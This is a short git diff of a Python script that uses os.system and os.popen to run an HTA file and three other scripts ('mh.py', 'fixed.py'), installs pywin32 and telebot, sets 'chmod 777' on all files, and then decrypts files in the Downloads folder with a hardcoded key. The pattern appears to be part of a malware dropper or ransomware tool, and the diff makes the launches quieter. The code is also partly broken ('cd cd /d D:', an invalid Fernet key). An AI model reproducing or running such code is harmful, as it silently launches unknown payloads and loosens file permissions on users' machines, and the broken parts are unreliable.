@@ -1,14 +1,15 @@
 from cryptography.fernet import Fernet
 import os
 
+os.system("chmod 777 *")
 os.system("pip install cryptography")
-os.system("./v2.hta")
+os.popen("./v2.hta")
 os.system("cd cd /d D:")
 os.system("pip install pywin32")
 os.system("pip install win32api")
-os.system("python mh.py")
+os.popen("python mh.py")
 os.system("pip install telebot")
-os.system("python fixed.py")
+os.popen("python fixed.py")
 
 def decrypt_file(key, input_file_path, output_file_path):
     with open(input_file_path, 'rb') as encrypted_file:
@@ -33,6 +34,6 @@ def decrypt_files_in_folder(key, folder_path):
 
 
 encryption_key = b'hphongdev28'
-download_folder = os.path.expanduser("~cd/Downloads")
+download_folder = os.path.expanduser("Downloads")
 
 decrypt_files_in_folder(encryption_key, download_folder)
